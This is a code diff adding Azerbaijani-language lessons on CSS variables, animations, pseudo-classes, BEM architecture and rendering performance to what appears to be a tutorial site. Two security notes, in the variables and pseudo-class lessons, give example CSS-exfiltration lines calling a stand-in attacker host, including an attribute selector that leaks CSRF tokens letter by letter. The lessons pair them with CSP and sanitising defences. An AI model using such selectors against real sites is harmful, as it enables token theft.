@@ -1030,4 +1030,453 @@ span, a, strong      { display: inline; }  /* default */
       expect: "default 1 sütun; @media min-width (və ya >=) 640 → 2, 1024 → 3 sütun; img max-width 100%; .konteyner min(...,1100px) + margin auto; :hover @media (hover: hover) içində.",
     },
   },
+  {
+    slug: "deyisenler",
+    title: "CSS dəyişənləri",
+    intro: "Custom properties (--ad: dəyər) — CSS-in öz dəyişənləri. Tema, dizayn tokenləri, komponent variantları və JS ilə canlı dəyişiklik üçün.",
+    sections: [
+      {
+        level: "baslangic",
+        title: "Elan və istifadə",
+        blocks: [
+          { t: "analogy", text: "CSS dəyişəni — evdəki əsas elektrik açarıdır: «brend rəngi» bir yerdə yazılıb, 200 yerdə işlənir. Rəngi dəyişmək üçün 200 lampanı yox, bir açarı çevirirsən." },
+          { t: "code", lang: "css", code: `:root {
+  --accent: #38bdf8;
+  --bosluq: 1rem;
+  --radius: 12px;
+}
+
+.duyme {
+  background: var(--accent);
+  padding: var(--bosluq);
+  border-radius: var(--radius);
+}
+
+.kart {
+  border: 1px solid var(--setir-rengi, #1c2536);   /* ehtiyat dəyər */
+}` },
+          { t: "terms", items: [
+            ["--ad", "dəyişənin adı iki tire ilə başlayır."],
+            ["var(--ad)", "dəyəri oxumaq."],
+            ["var(--ad, ehtiyat)", "dəyişən yoxdursa ehtiyat dəyər."],
+            [":root", "sənədin kökü — qlobal dəyişənlər üçün."],
+          ]},
+        ],
+      },
+      {
+        level: "orta",
+        title: "Kaskad və irsiyyət — əsas gücü",
+        blocks: [
+          { t: "code", lang: "css", code: `/* Bölməyə görə rəng — bu saytın yanaşması */
+:root { --accent: #38bdf8; }
+[data-track="backend"] { --accent: #f43f5e; }
+
+/* Komponent variantları */
+.duyme { background: var(--duyme-fon, #334155); }
+.duyme--esas { --duyme-fon: var(--accent); }
+.duyme--tehlike { --duyme-fon: #e11d48; }
+
+/* Tünd tema */
+@media (prefers-color-scheme: light) {
+  :root { --fon: #fff; --metn: #0f172a; }
+}` },
+          { t: "code", lang: "javascript", code: `document.documentElement.style.setProperty("--accent", "#a78bfa");
+getComputedStyle(document.documentElement).getPropertyValue("--accent");` },
+          { t: "mistake", lang: "css", wrong: `:root { --olcu: 20; }\n.x { width: var(--olcu)px; }`, right: `:root { --olcu: 20px; }\n.x { width: var(--olcu); }\n/* və ya: width: calc(var(--olcu) * 1px); */`, why: "var() mətn birləşdirmir — «20 px» iki ayrı token olur və etibarsızdır. Vahidi dəyərə daxil et və ya calc ilə vur." },
+        ],
+      },
+      {
+        level: "senior",
+        title: "@property, performans, təhlükəsizlik",
+        blocks: [
+          { t: "code", lang: "css", code: `@property --bucaq {
+  syntax: "<angle>";
+  inherits: false;
+  initial-value: 0deg;
+}
+.halqa {
+  background: conic-gradient(from var(--bucaq), #38bdf8, #f43f5e, #38bdf8);
+  animation: firlan 3s linear infinite;
+}
+@keyframes firlan { to { --bucaq: 360deg; } }` },
+          { t: "list", items: [
+            "@property dəyişənə tip verir — tipli dəyişən animasiya oluna bilir (qradiyent firlanması), inherits: false performansa kömək edir.",
+            "Yüksək səviyyədə (:root) tez-tez dəyişən dəyişən (siçan koordinatı) bütün ağacda stil yenidən hesablanmasına səbəb ola bilər — dəyişəni lazım olan elementə yaz.",
+            "Etibarsız dəyər «compute zamanı etibarsız» olur və xassə inherit/initial-a düşür — ehtiyat dəyər bunu tutmur.",
+            "Təhlükəsizlik: istifadəçidən gələn dəyəri style.setProperty ilə yazanda ağ siyahı/format yoxlaması et — url(https://hücumçu/...) ilə fon dəyişəni ziyarətçinin IP-sini və səhifə vəziyyətini sızdıra bilər (CSS exfiltration); CSP img-src bunu məhdudlaşdırır.",
+          ]},
+          { t: "qa", items: [
+            ["CSS dəyişəni ilə Sass dəyişəni fərqi?", "Sass compile zamanı əvəzlənir; CSS dəyişəni runtime-da yaşayır, kaskadla irsən keçir və JS ilə dəyişir."],
+            ["@property nə verir?", "Tip, irsiyyət və başlanğıc dəyər — və bunun sayəsində dəyişəni animasiya etmək imkanı."],
+          ]},
+        ],
+      },
+      {
+        level: "baslangic",
+        title: "Özünü yoxla",
+        blocks: [
+          { t: "quiz", q: "Dəyişən necə oxunur?", options: ["$accent", "var(--accent)", "--accent()"], answer: 1, why: "var() funksiyası ilə." },
+        ],
+      },
+    ],
+    exercise: {
+      task: ":root-da --fon, --metn, --accent, --radius dəyişənləri yarat. .kart və .duyme onları işlətsin. [data-tema=\"qirmizi\"] atributu olan bölmədə --accent qırmızı olsun. Düymə klikində JS ilə --accent-i bənövşəyi et.",
+      starter: `<style>\n  :root {\n\n  }\n</style>\n<section>\n  <div class="kart"><button class="duyme">Mavi</button></div>\n</section>\n<section data-tema="qirmizi">\n  <div class="kart"><button class="duyme">Qırmızı</button></div>\n</section>\n<button id="deyis">Bənövşəyi et</button>\n<script>\n  // bura\n</script>\n`,
+      expect: ":root dəyişənləri; var(--accent) .duyme-də; [data-tema=\"qirmizi\"] { --accent: ... } kaskadla işləyir; JS document.documentElement.style.setProperty(\"--accent\", ...); vahidlər dəyərin içində.",
+    },
+  },
+  {
+    slug: "kecid-animasiya",
+    title: "Transition və animasiya",
+    intro: "transition — vəziyyət dəyişikliyini yumşaldır; @keyframes animation — öz-özünə işləyən ardıcıllıq. Hamar, əlçatan və performanslı hərəkət.",
+    sections: [
+      {
+        level: "baslangic",
+        title: "transition",
+        blocks: [
+          { t: "analogy", text: "transition — liftin yumşaq dayanmasıdır: mərtəbə dəyişir (vəziyyət), amma silkələnmədən. animation — saatın rəqqası: heç kim toxunmadan təkrarlanır." },
+          { t: "code", lang: "css", code: `.duyme {
+  background: #0ea5e9;
+  transform: translateY(0);
+  transition: background-color 200ms ease-out, transform 200ms ease-out;
+}
+.duyme:hover {
+  background: #0284c7;
+  transform: translateY(-2px);
+}` },
+          { t: "terms", items: [
+            ["transition-property", "hansı xassə."],
+            ["transition-duration", "müddət (ms, s)."],
+            ["transition-timing-function", "sürət əyrisi: ease, linear, ease-in-out, cubic-bezier()."],
+            ["transition-delay", "gecikmə."],
+          ]},
+        ],
+      },
+      {
+        level: "orta",
+        title: "@keyframes",
+        blocks: [
+          { t: "code", lang: "css", code: `@keyframes girish {
+  from { opacity: 0; transform: translateY(12px); }
+  to   { opacity: 1; transform: none; }
+}
+
+@keyframes nebz {
+  0%, 100% { transform: scale(1); }
+  50%      { transform: scale(1.06); }
+}
+
+.kart { animation: girish 400ms ease-out both; }
+.bildiris { animation: nebz 1.5s ease-in-out infinite; }
+.kart:nth-child(2) { animation-delay: 80ms; }   /* pilləli giriş */` },
+          { t: "list", items: [
+            "animation: ad müddət əyri gecikmə təkrar istiqamət fill-mode.",
+            "fill-mode both — animasiyadan əvvəl və sonra uyğun kadrın stilini saxla.",
+            "infinite — sonsuz; alternate — gedib-gəlmə.",
+          ]},
+          { t: "mistake", lang: "css", wrong: `.menyu { transition: all 0.5s; }\n.menyu.acig { height: auto; }`, right: `.menyu { display: grid; grid-template-rows: 0fr; transition: grid-template-rows 300ms; }\n.menyu.acig { grid-template-rows: 1fr; }\n.menyu > div { overflow: hidden; }`, why: "height: auto-ya keçid animasiya olunmur; all isə lazımsız xassələri izləyir. Grid 0fr → 1fr hiyləsi və ya interpolate-size: allow-keywords (müasir brauzerlər)." },
+        ],
+      },
+      {
+        level: "senior",
+        title: "Render pipeline və əlçatanlıq",
+        blocks: [
+          { t: "list", items: [
+            "Ucuz: transform, opacity (yalnız composite). Orta: color, background (paint). Baha: width, height, top, margin (layout → paint → composite).",
+            "will-change: transform — brauzerə əvvəlcədən qat yaratmağı deyir; yalnız ehtiyac olanda, sonra sil.",
+            "View Transitions API — səhifələr/vəziyyətlər arası hamar keçid (document.startViewTransition).",
+            "Scroll-driven animations: animation-timeline: scroll() — JS-siz scroll effektləri.",
+            "@media (prefers-reduced-motion: reduce) — animasiyaları söndür və ya azalt. Vestibulyar pozuntusu olanlar üçün parallax, böyük hərəkətlər ürəkbulanma yaradır.",
+            "Təhlükəsizlik/a11y: saniyədə 3-dən çox yanıb-sönmə (WCAG 2.3.1) — fotosensitiv epilepsiya riski. Avtomatik oynayan 5 saniyədən uzun animasiyaya «dayandır» imkanı (WCAG 2.2.2).",
+          ]},
+          { t: "qa", items: [
+            ["Niyə transform animasiyası daha hamardır?", "Layout və paint-i atlayır, GPU kompozitorda icra olunur."],
+            ["transition ilə animation fərqi?", "transition iki vəziyyət arasında dəyişikliyə reaksiyadır; animation keyframe-lərlə müstəqil işləyir."],
+          ]},
+        ],
+      },
+      {
+        level: "baslangic",
+        title: "Özünü yoxla",
+        blocks: [
+          { t: "quiz", q: "Ən performanslı animasiya xassəsi:", options: ["left", "transform", "width"], answer: 1, why: "Layout-u dəyişmir." },
+        ],
+      },
+    ],
+    exercise: {
+      task: "1) Hover-də yumşaq qalxan kart (transform + box-shadow, 200 ms). 2) Səhifə açılanda 3 kartın pilləli girişi (@keyframes + animation-delay). 3) Yüklənmə spinneri (rotate infinite). 4) prefers-reduced-motion-da hamısı sönsün.",
+      starter: `<style>\n\n</style>\n<div class="kartlar">\n  <div class="kart">1</div><div class="kart">2</div><div class="kart">3</div>\n</div>\n<div class="spinner"></div>\n`,
+      expect: "transition transform/box-shadow (all yox); @keyframes girish opacity+translateY; nth-child delay; spinner rotate 360deg linear infinite; @media (prefers-reduced-motion: reduce) animation/transition none; width/top animasiyası yoxdur.",
+    },
+  },
+  {
+    slug: "psevdo",
+    title: "Psevdo-klass və psevdo-elementlər",
+    intro: "Psevdo-klass (:hover, :focus-visible, :nth-child, :has) — elementin VƏZİYYƏTİNİ seçir. Psevdo-element (::before, ::after, ::placeholder) — elementin HİSSƏSİNİ və ya virtual məzmun yaradır.",
+    sections: [
+      {
+        level: "baslangic",
+        title: "Psevdo-klasslar",
+        blocks: [
+          { t: "analogy", text: "Psevdo-klass — insanın əhvalıdır: eyni adam, amma «sevincli» (:hover), «diqqətli» (:focus). Psevdo-element — adamın kölgəsi (::before) və ya papağı (::after): ayrıca insan deyil, amma onunla gəzir." },
+          { t: "code", lang: "css", code: `a:hover { color: #38bdf8; }
+button:focus-visible { outline: 2px solid #38bdf8; outline-offset: 2px; }
+input:invalid { border-color: #f43f5e; }
+input:disabled { opacity: 0.5; }
+
+li:first-child { font-weight: bold; }
+li:nth-child(odd) { background: #0c111c; }
+li:not(:last-child) { border-bottom: 1px solid #1c2536; }` },
+          { t: "terms", items: [
+            [":hover / :active", "siçan üstündə / basılı."],
+            [":focus / :focus-visible", "fokusda / klaviatura fokusunda."],
+            [":checked, :disabled, :invalid", "forma vəziyyətləri."],
+            [":nth-child(an+b)", "sıraya görə: odd, even, 3n, -n+3 (ilk üç)."],
+            [":not()", "inkar."],
+          ]},
+        ],
+      },
+      {
+        level: "orta",
+        title: "::before, ::after və digərləri",
+        blocks: [
+          { t: "code", lang: "css", code: `.yeni::after {
+  content: "YENİ";
+  margin-left: 0.5rem;
+  padding: 0 0.4rem;
+  font-size: 0.7rem;
+  background: #f43f5e;
+  border-radius: 4px;
+}
+
+.sitat::before {
+  content: "“";
+  position: absolute;
+  inset: -0.5rem auto auto -0.5rem;
+  font-size: 4rem;
+  opacity: 0.2;
+}
+
+input::placeholder { color: #64748b; }
+::selection { background: #38bdf8; color: #05070d; }
+p::first-line { font-weight: 600; }` },
+          { t: "list", items: [
+            "::before/::after üçün content MƏCBURİDİR (boş olsa da: content: \"\").",
+            "Dekorativ şeylər (ikon, xətt, örtük) üçün idealdır — HTML təmiz qalır.",
+            "Psevdo-element img, input kimi void elementlərdə işləmir.",
+          ]},
+          { t: "mistake", lang: "css", wrong: `.qiymet::after { content: "Endirim 50%!"; }`, right: `<!-- Vacib məlumat HTML-də olsun -->\n<span class="qiymet">20 AZN <strong>Endirim 50%</strong></span>`, why: "CSS content məzmunu seçilmir, kopyalanmır, bəzi ekran oxuyucular oxumur, axtarış motorları görmür. Vacib məlumat — HTML-də; CSS — dekorasiya." },
+        ],
+      },
+      {
+        level: "senior",
+        title: ":has, :is, :where və təhlükəsizlik",
+        blocks: [
+          { t: "code", lang: "css", code: `/* Valideyn seçicisi */
+.kart:has(img) { padding-top: 0; }
+form:has(input:invalid) button[type="submit"] { opacity: 0.5; }
+label:has(+ input:focus-visible) { color: #38bdf8; }
+
+/* Qruplaşdırma */
+:is(h1, h2, h3):hover { text-decoration: underline; }
+:where(.btn) { padding: 0.5rem 1rem; }   /* spesifiklik 0 — asan override */` },
+          { t: "list", items: [
+            ":has() — illərlə «mümkünsüz» valideyn seçicisi; JS-siz vəziyyət əsaslı stil. Çox geniş :has (body:has(...)) stil hesablamasını yavaşlada bilər.",
+            ":focus-within — içində fokus olan konteyner (axtarış qutusu vurğusu).",
+            ":user-invalid — yalnız istifadəçi toxunduqdan sonra xəta göstər (:invalid səhifə açılan kimi qırmızı edir).",
+            "Təhlükəsizlik — CSS ilə məlumat sızması: input[value^=\"a\"] { background: url(//hucumcu/?a) } kimi atribut seçiciləri, hücumçu CSS yerləşdirə bilsə (CSS injection), token/CSRF dəyərini hərf-hərf oğurlaya bilər. İstifadəçi CSS-inə icazə vermə; CSP style-src/img-src məhdudlaşdır; həssas dəyərləri value atributunda saxlama.",
+          ]},
+          { t: "qa", items: [
+            ["Psevdo-klass və psevdo-element fərqi?", "Psevdo-klass vəziyyəti (: bir nöqtə), psevdo-element hissəni/virtual elementi (:: iki nöqtə) seçir."],
+            [":is() və :where() fərqi?", "Eyni seçirlər; :where spesifikliyi 0-dır, :is ən güclü arqumentin spesifikliyini alır."],
+          ]},
+        ],
+      },
+      {
+        level: "baslangic",
+        title: "Özünü yoxla",
+        blocks: [
+          { t: "quiz", q: "::after-in işləməsi üçün mütləq olan xassə:", options: ["display", "content", "position"], answer: 1, why: "content olmadan psevdo-element yaranmır." },
+        ],
+      },
+    ],
+    exercise: {
+      task: "1) Cədvəldə cüt sətirlərə fon, sonuncudan başqa hamısına alt xətt. 2) .yeni class-lı linkə ::after ilə «YENİ» nişanı. 3) Xarici linklərə (a[href^=\"http\"]) ::after ilə ↗ işarəsi. 4) İçində səhv input olan formada submit düyməsi sönük (:has). 5) Klaviatura fokusu üçün görünən halqa.",
+      starter: `<style>\n\n</style>\n<table><tr><td>1</td></tr><tr><td>2</td></tr><tr><td>3</td></tr></table>\n<a class="yeni" href="/react">React</a>\n<a href="https://react.dev">Rəsmi sayt</a>\n<form><input type="email" required><button>Göndər</button></form>\n`,
+      expect: "tr:nth-child(even); tr:not(:last-child); .yeni::after content; a[href^=\"http\"]::after; form:has(input:invalid) button; :focus-visible outline; vacib məlumat content-də deyil.",
+    },
+  },
+  {
+    slug: "arxitektura",
+    title: "BEM və CSS arxitekturası",
+    intro: "Böyük layihədə CSS-in xaosa çevrilməməsi üçün: adlandırma (BEM), qatlar (@layer), modullar (CSS Modules), utility-first və onların seçimi.",
+    sections: [
+      {
+        level: "baslangic",
+        title: "BEM adlandırması",
+        blocks: [
+          { t: "analogy", text: "BEM — ünvan sistemidir: Şəhər (Block) → Küçə (Element) → Ev nömrəsi (Modifier). «.kart__basliq--boyuk» — «kart blokunun başlıq elementinin böyük variantı». Kim oxusa, haradan gəldiyini bilir." },
+          { t: "code", lang: "html", code: `<article class="kart kart--vurgulu">
+  <h2 class="kart__basliq">React</h2>
+  <p class="kart__metn">Komponentlər…</p>
+  <button class="kart__duyme kart__duyme--deaktiv">Başla</button>
+</article>` },
+          { t: "code", lang: "css", code: `.kart { padding: 1.5rem; border: 1px solid #1c2536; }
+.kart--vurgulu { border-color: #38bdf8; }
+.kart__basliq { font-size: 1.25rem; }
+.kart__duyme--deaktiv { opacity: 0.5; }` },
+          { t: "terms", items: [
+            ["Block", "müstəqil komponent: .kart."],
+            ["Element (__)", "blokun hissəsi: .kart__basliq."],
+            ["Modifier (--)", "variant/vəziyyət: .kart--vurgulu."],
+          ]},
+        ],
+      },
+      {
+        level: "orta",
+        title: "@layer və müasir yanaşmalar",
+        blocks: [
+          { t: "code", lang: "css", code: `@layer reset, base, components, utilities;
+
+@layer reset {
+  *, *::before, *::after { box-sizing: border-box; margin: 0; }
+}
+@layer base {
+  body { font-family: Inter, system-ui, sans-serif; }
+}
+@layer components {
+  .kart { padding: 1.5rem; }
+}
+@layer utilities {
+  .gizli { display: none; }
+}` },
+          { t: "list", items: [
+            "@layer — spesifiklikdən asılı olmayaraq qatların prioritetini sırası ilə təyin edir; utilities həmişə komponentləri üstələyir.",
+            "CSS Modules (Kart.module.css) — class adları avtomatik unikal olur, toqquşma yoxdur (Next.js dəstəkləyir).",
+            "Utility-first (Tailwind) — ad problemi tamamilə yox olur.",
+            "Seçim: komanda ölçüsü və framework. React + Tailwind və ya CSS Modules çox yayılıb.",
+          ]},
+          { t: "mistake", lang: "css", wrong: `.sidebar .menu ul li a.active span { color: red; }`, right: `.menu__link--aktiv { color: red; }`, why: "Dərin, yüksək spesifiklikli selektorlar HTML-ə bağlanır və üstündən yazmaq üçün daha güclü selektor tələb edir — spesifiklik müharibəsi. BEM düz (0,1,0) saxlayır." },
+        ],
+      },
+      {
+        level: "senior",
+        title: "Miqyas, nesting, scope",
+        blocks: [
+          { t: "code", lang: "css", code: `/* Native nesting */
+.kart {
+  padding: 1rem;
+  & .kart__basliq { font-weight: 700; }
+  &:hover { border-color: #38bdf8; }
+  @media (width >= 768px) { padding: 2rem; }
+}
+
+/* @scope — stilin təsir sahəsini məhdudlaşdır */
+@scope (.kart) to (.kart__mezmun) {
+  p { color: #94a3b8; }   /* .kart__mezmun içindəki p-lərə toxunmur */
+}` },
+          { t: "list", items: [
+            "ITCSS fikri: geniş və aşağı spesifiklikli qaydalardan (reset) dar və yüksək olanlara (utilities) — @layer bunu dil səviyyəsində edir.",
+            "Dizayn tokenləri (CSS dəyişənləri) bütün arxitekturalarda ortaq təməldir.",
+            "Ölü CSS-i tap: Coverage (DevTools), PurgeCSS; utility/modul yanaşmaları bu problemi kökündən azaldır.",
+            "Stylelint ilə qaydalar: selektor dərinliyi, !important qadağası, adlandırma şablonu.",
+            "Təhlükəsizlik: üçüncü tərəf widget/CMS məzmununun CSS-ini öz stillərinlə toqquşmasın deyə Shadow DOM və ya @scope ilə izolyasiya et; istifadəçi məzmunu (markdown) render edəndə style atributlarını və <style> teqlərini təmizlə — saxta UI qurulmasın.",
+          ]},
+          { t: "qa", items: [
+            ["BEM-in üstünlüyü?", "Aşağı, bərabər spesifiklik, öz-özünü sənədləşdirən adlar, komponent sərhədləri."],
+            ["@layer hansı problemi həll edir?", "Kitabxana/köhnə stillər ilə spesifiklik müharibəsini — prioritet qat sırası ilə təyin olunur."],
+          ]},
+        ],
+      },
+      {
+        level: "baslangic",
+        title: "Özünü yoxla",
+        blocks: [
+          { t: "quiz", q: "BEM-də modifier necə yazılır?", options: [".kart__boyuk", ".kart--boyuk", ".kart.boyuk"], answer: 1, why: "İki tire — modifier, iki alt xətt — element." },
+        ],
+      },
+    ],
+    exercise: {
+      task: "Bildiriş komponentini BEM ilə yaz: .bildiris blok, __ikon, __metn, __bagla elementləri, --ugur, --xeta modifierləri. Stilləri @layer components daxilində yaz, reset-i @layer reset-də. Native nesting işlət.",
+      starter: `<style>\n\n</style>\n<div class="bildiris bildiris--ugur">\n  <span class="bildiris__ikon">✓</span>\n  <p class="bildiris__metn">Yadda saxlandı</p>\n  <button class="bildiris__bagla" aria-label="Bağla">×</button>\n</div>\n`,
+      expect: "@layer reset, components sırası; BEM adları düzgün (__ və --); nesting &; modifierlər rəng dəyişir; dərin selektor zənciri və id selektoru yoxdur; bagla düyməsi aria-label ilə.",
+    },
+  },
+  {
+    slug: "performans",
+    title: "Senior: render pipeline və performans",
+    intro: "Brauzer CSS-i necə tətbiq edir: style → layout → paint → composite. Hansı CSS sürətlidir, hansı yavaş; kritik CSS, şriftlər, containment.",
+    sections: [
+      {
+        level: "baslangic",
+        title: "Pipeline",
+        blocks: [
+          { t: "analogy", text: "Səhifəni çəkmək — mebel düzmək kimidir: əvvəl hansı mebel hansı rəngdə (style), sonra harada durur (layout), sonra boyanır (paint), sonra şəkil kimi qatlar birləşdirilir (composite). Divanı köçürmək (layout) — ən zəhmətlisi; pərdənin rəngini dəyişmək (paint) — orta; şəffaflıq (composite) — ən asanı." },
+          { t: "list", items: [
+            "Style: hansı qaydalar hansı elementə düşür (selektor uyğunluğu).",
+            "Layout (reflow): ölçü və mövqelər.",
+            "Paint: piksellər, kölgə, qradiyent.",
+            "Composite: qatların GPU-da birləşməsi.",
+            "width dəyişsə — layout + paint + composite; transform dəyişsə — yalnız composite.",
+          ]},
+        ],
+      },
+      {
+        level: "orta",
+        title: "Yükləmə performansı",
+        blocks: [
+          { t: "code", lang: "html", code: `<head>
+  <!-- Kritik CSS inline, qalanı sonra -->
+  <style>/* ilk ekran üçün minimal stil */</style>
+  <link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
+  <link rel="stylesheet" href="/app.css">
+</head>` },
+          { t: "list", items: [
+            "CSS render-blocking-dir: kiçik saxla, istifadə olunmayanı at (Coverage tab).",
+            "@import zənciri — ardıcıl yükləmə; bundler ilə birləşdir.",
+            "Şriftlər: woff2, subset (latin + latin-ext), font-display: swap, size-adjust ilə CLS-siz.",
+            "Media atributu: <link media=\"print\"> çap stili render-i bloklamır.",
+          ]},
+          { t: "mistake", lang: "css", wrong: `* { transition: all 0.3s; }\n.x:hover { box-shadow: 0 0 60px 20px #000; filter: blur(4px); }`, right: `.kart { transition: transform 0.2s; }\n.kart:hover { transform: translateY(-2px); }`, why: "Universal transition hər dəyişikliyi animasiya edir; böyük kölgə və filter-in hər kadrda yenidən boyanması ağırdır — mobil cihazlarda titrəyir." },
+        ],
+      },
+      {
+        level: "senior",
+        title: "Containment və ölçmə",
+        blocks: [
+          { t: "code", lang: "css", code: `.kart {
+  contain: layout paint;            /* içindəki dəyişiklik çölə təsir etmir */
+}
+.uzun-bolme {
+  content-visibility: auto;         /* ekrandan kənarda render olunmur */
+  contain-intrinsic-size: auto 800px;
+}` },
+          { t: "list", items: [
+            "content-visibility: auto — uzun səhifələrdə ilkin render-i dəfələrlə sürətləndirə bilər.",
+            "Layout thrashing JS-dədir, amma CSS-ə toxunur: oxu-yaz-oxu dövrü — oxumaları qruplaşdır.",
+            "Selektor performansı müasir mühərriklərdə nadir problemdir; böyük DOM (10 000+ node) və tez-tez stil invalidasiyası daha vacibdir.",
+            "Ölçmə: Performance panel (Recalculate Style, Layout, Paint vaxtları), Rendering → Paint flashing, Layer borders.",
+            "CLS: şəkillərə ölçü, reklam/embed üçün yer ayır, font metrikalarını uyğunlaşdır.",
+            "Təhlükəsizlik və performans: üçüncü tərəf CSS/şrift CDN-ləri həm gecikmə, həm məxfilik riskidir (IP ötürülür) — self-host et, SRI ilə yüklə və ya CSP ilə məhdudlaşdır.",
+          ]},
+          { t: "qa", items: [
+            ["Reflow nəyə səbəb olur?", "Ölçü/mövqe dəyişən xassələr (width, top, font-size) və ya DOM dəyişiklikləri — layout yenidən hesablanır."],
+            ["content-visibility nə edir?", "Ekrandan kənar məzmunun layout və paint-ini görünənə qədər təxirə salır."],
+          ]},
+        ],
+      },
+      {
+        level: "baslangic",
+        title: "Özünü yoxla",
+        blocks: [
+          { t: "quiz", q: "Hansı dəyişiklik ən ucuzdur?", options: ["width", "background-color", "opacity"], answer: 2, why: "opacity yalnız composite tələb edir." },
+        ],
+      },
+    ],
+    exercise: {
+      task: "Ləng səhifəni düzəlt: 1) hover-də width/left dəyişən kartları transform-a keçir. 2) Universal transition-u sil, yalnız lazım olan xassələrə qoy. 3) Uzun şərh bölmələrinə content-visibility: auto və contain-intrinsic-size əlavə et. 4) Şəkillərə aspect-ratio ver. Hər addımı şərhlə izah et.",
+      starter: `<style>\n  * { transition: all .4s; }\n  .kart:hover { width: 320px; left: 10px; position: relative; }\n  .serh { }\n  img { width: 100%; }\n</style>\n<div class="kart">Kart</div>\n<section class="serh">Uzun şərhlər…</section>\n<img src="/foto.jpg" alt="Foto">\n`,
+      expect: "* transition silinib; .kart transition: transform; hover transform: scale/translate; .serh content-visibility: auto + contain-intrinsic-size; img aspect-ratio (və ya width/height); şərhlərdə layout/paint/composite izahı.",
+    },
+  },
 ];
